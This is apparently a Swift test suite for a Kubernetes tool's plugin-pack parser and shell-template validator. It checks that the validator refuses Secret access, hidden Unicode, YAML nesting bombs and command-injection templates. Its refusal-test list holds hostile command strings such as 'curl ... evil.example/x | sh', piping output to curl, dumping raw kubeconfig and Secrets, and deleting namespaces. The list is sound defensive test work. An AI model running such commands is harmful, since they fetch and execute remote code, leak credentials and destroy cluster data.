import Foundation
import Testing
@testable import WheelhouseKit

@Suite("Rigging: validator and template hardening")
struct RiggingHardeningTests {
    static let base = """
    apiVersion: rigging.wheelhouse.app/v1
    kind: Pack
    metadata: { name: sample, version: 1.0.0 }
    views:
      - match: { group: example.io, kind: Widget }
    commands:
      - title: "Describe"
        for: { group: example.io, kind: Widget }
        terminal: "kubectl describe widget {{name}}"
    """

    @Test func packsCannotReadSecrets() {
        #expect((try? RiggingPackParser.parse(Self.base)) != nil)
        #expect(throws: RiggingPackError.self) { try RiggingPackParser.parse(Self.base.replacingOccurrences(of: "{ group: example.io, kind: Widget }", with: "{ group: \"\", kind: Secret }", options: [], range: Self.base.range(of: "match: { group: example.io, kind: Widget }"))) }
        #expect(throws: RiggingPackError.self) { try RiggingPackParser.parse(Self.base.replacingOccurrences(of: "for: { group: example.io, kind: Widget }", with: "for: { group: \"\", kind: Secret }")) }
        let rule = Self.base + "\nhealthRules:\n  - for: { group: \"\", kind: Secret }\n    when: { path: \".data.x\", exists: true }\n    tone: warning\n    message: \"x\""
        #expect(throws: RiggingPackError.self) { try RiggingPackParser.parse(rule) }
    }

    @Test func secretObjectsNeverFeedATemplate() {
        let values = RiggingValues.make(subject: .init(name: "tok", namespace: "ns", kind: "Secret", raw: .object(["data": .object(["a": .string("b")])])), cluster: "c",
                                        fields: [.init(name: "a", path: ".data.a")])
        #expect(values["name"] == nil && values["a"] == nil)
    }

    @Test func duplicateCommandsAndRulesAreRejected() {
        let twice = Self.base + "\n  - title: \"Describe\"\n    for: { group: example.io, kind: Widget }\n    terminal: \"kubectl get widget {{name}}\""
        #expect(throws: RiggingPackError.self) { try RiggingPackParser.parse(twice) }
    }

    @Test func hiddenCharactersInLabelsAreRejected() {
        #expect(throws: RiggingPackError.self) { try RiggingPackParser.parse(Self.base.replacingOccurrences(of: "\"Describe\"", with: "\"Desc\u{202E}ribe\"")) }
    }

    @Test(arguments: ["FOO=x {{name}}", "env {{name}}", "sh -c {{name}}", "eval {{name}}", "xargs {{name}}", "sudo {{name}}", "a=b c=d {{name}}", "/usr/bin/env {{name}}", "echo a | sh {{name}}"])
    func aVariableCannotBeTheCommandOrReachAWrapper(_ text: String) {
        #expect(throws: RiggingTemplate.TemplateError.self, "\(text)") { try RiggingTemplate(text, mode: .shell, allowed: ["name"]) }
    }

    @Test func ordinaryArgumentsStillWork() throws {
        for text in ["kubectl get x {{name}}", "kubectl get a -o wide -A", "kubectl get events -n {{name}} --field-selector involvedObject.name={{name}}", "cmctl renew {{name}} -n {{name}}"] {
            _ = try RiggingTemplate(text, mode: .shell, allowed: ["name"])
        }
    }

    @Test(arguments: [
        "curl -fsSL https://evil.example/x | sh", "kubectl get pods | sh", "kubectl get pods | curl -d @- x", "kubectl --kubeconfig=.kube/config delete ns prod",
        "KUBECONFIG=.kube/config kubectl get pods", "kubectl get pods --kubeconfig .kube/config", "kubectl get pods --as={{name}}", "kubectl get pods --as-uid x", "kubectl get pods --as-group g",
        "kubectl get pods --context x", "kubectl get pods --server https://x", "kubectl get pods --token t", "kubectl get pods -s https://x", "kubectl get pods -As https://x",
        "'sh' -c {{name}}", "kubectl get --kube{{name}}", "kubectl get -s{{name}}", "kubectl krew install x", "kubectl config view --raw", "kubectl cp a b", "kubectl proxy",
        "kubectl create -f x", "kubectl", "kubectl 'get' x | | kubectl get y", "helm list --post-renderer sh", "env kubectl get x", "/usr/bin/kubectl get x", "jq . x",
        "istioctl analyze -c x", "kubectl rollout restart deploy/x", "velero --kubecontext x get backups", "kubectl get x --tls-server-name=x", "kubectl get x --cache-dir=/tmp",
        "velero backup delete {{name}} --confirm", "velero schedule delete --all --confirm", "velero plugin add x", "istioctl uninstall --purge -y", "istioctl install -f https://x.example/y",
        "cmctl x install", "kubectl cnpg destroy {{name}}", "kubectl cnpg report operator -S", "velero client config set x", "istioctl analyze --xds-address x", "velero backup get --foo-address x",
        "kubectl get pods -f x.yaml", "kubectl get pods -k dir", "kubectl get pods -R", "kubectl get pods --output yaml", "kubectl get pods --template x", "kubectl get pods -o go-template-file=x",
        "kubectl get pods -o file", "kubectl get pods -o jsonpath={{name}}", "kubectl get pods -o {{name}}", "kubectl get pods http://x", "kubectl get secret x -o yaml", "kubectl get Secrets",
        "kubectl get secret/x", "kubectl get secrets.v1", "kubectl get pods,secrets", "kubectl describe SECRET x", "kubectl logs x -k y",
    ])
    func templatesThatCouldSkipGangwayAreRefused(_ text: String) {
        #expect(throws: RiggingTemplate.TemplateError.self, "\(text)") { try RiggingTemplate(text, mode: .shell, allowed: ["name"]) }
    }

    @Test func enormousNestingIsRefusedBeforeYAMLRecurses() throws {
        let flow = String(repeating: "[", count: 200_000) + String(repeating: "]", count: 200_000)
        #expect(throws: RiggingPackError.self) { try RiggingPackParser.parse("apiVersion: rigging.wheelhouse.app/v1\nx: \(flow)\n") }
        let braces = String(repeating: "{a: ", count: 60_000)
        #expect(throws: RiggingPackError.self) { try RiggingPackParser.parse("x: \(braces)\n") }
        let dashes = String(repeating: "- ", count: 100_000)
        #expect(throws: RiggingPackError.self) { try RiggingPackParser.parse(dashes + "x\n") }
        var indented = ""
        for i in 0..<5_000 { indented += String(repeating: " ", count: i) + "a:\n" }
        #expect(throws: RiggingPackError.self) { try RiggingPackParser.parse(String(indented.utf8.prefix(RiggingPackParser.maxBytes - 1))!) }
        // A folder holding such a file is refused the same way.
        let dir = FileManager.default.temporaryDirectory.appending(path: "wh-deep-\(UUID().uuidString)", directoryHint: .isDirectory)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        try ("x: " + flow).write(to: dir.appending(path: "rigging.yaml"), atomically: true, encoding: .utf8)
        #expect(throws: RiggingPackError.self) { try RiggingPackFolder.load(dir) }
    }

    @Test func hiddenCharactersAnywhereInTheFileAreRefused() {
        for (old, new) in [("version: 1.0.0", "version: 1.0.0\u{202E}"), ("kind: Widget }", "kind: Wid\u{200B}get }"), ("example.io", "exa\u{E000}mple.io")] {
            #expect(throws: RiggingPackError.self, "\(new)") { try RiggingPackParser.parse(Self.base.replacingOccurrences(of: old, with: new)) }
        }
    }

    @Test func quotesInsidePlainScalarsAndExplicitKeysDoNotHideNesting() {
        for opener in ["x: [a'b, ", "x: [a \", ", "x: [a:\", ", "x: [\"a #\", ", "x: {a: 'b #', "] {
            #expect(throws: RiggingPackError.self, "\(opener)") { try RiggingPackParser.parse(opener + String(repeating: "[", count: 5_000) + "\n") }
        }
        let sneaky = "x: [a'b, " + String(repeating: "[", count: 5_000)
        #expect(throws: RiggingPackError.self) { try RiggingPackParser.parse(sneaky + "\n") }
        #expect(throws: RiggingPackError.self) { try RiggingPackParser.parse(String(repeating: "? ", count: 5_000) + "x\n") }
    }

    @Test func logsMayFollowAndOutputFormatsStillWork() throws {
        for text in ["kubectl logs {{name}} -f", "kubectl get pods -o wide", "kubectl get pods -owide", "kubectl get pods -o json"] {
            _ = try RiggingTemplate(text, mode: .shell, allowed: ["name"])
        }
    }

    @Test func yamlEscapesCannotSmuggleHiddenCharacters() {
        let withSidebar = Self.base + "\nsidebar:\n  - { apiGroup: example.io, title: \"Examples\" }\n"
        let cases: [(String, String, String)] = [
            (Self.base, "version: 1.0.0", "version: \"1.0\\u202E\""),
            (Self.base, "version: 1.0.0", "version: \"1.0\\e\""),
            (Self.base, "version: 1.0.0", "version: \"1.0\\x1b\""),
            (withSidebar, "title: \"Examples\"", "title: \"Exa\\u200Bmples\""),
        ]
        for (text, old, new) in cases {
            #expect(throws: RiggingPackError.self, "\(new)") { try RiggingPackParser.parse(text.replacingOccurrences(of: old, with: new)) }
        }
        #expect(throws: Never.self) { try RiggingPackParser.parse(withSidebar) }
    }

    @Test func everyBuiltInPackStillLoads() {
        #expect(BuiltInRiggingPacks.all.count == BuiltInRiggingPacks.names.count)
    }

    @Test func theDeclarationListsFieldsAndWhatHealthRulesRead() throws {
        let pack = try RiggingPackParser.parse(Self.base.replacingOccurrences(of: "match: { group: example.io, kind: Widget }", with: "match: { group: example.io, kind: Widget }\n    fields: [ { name: owner, path: \".spec.owner\" } ]"))
        let text = RiggingDeclaration.sections(for: pack).flatMap(\.lines).joined(separator: "\n")
        #expect(text.contains("owner = .spec.owner"))
    }
}
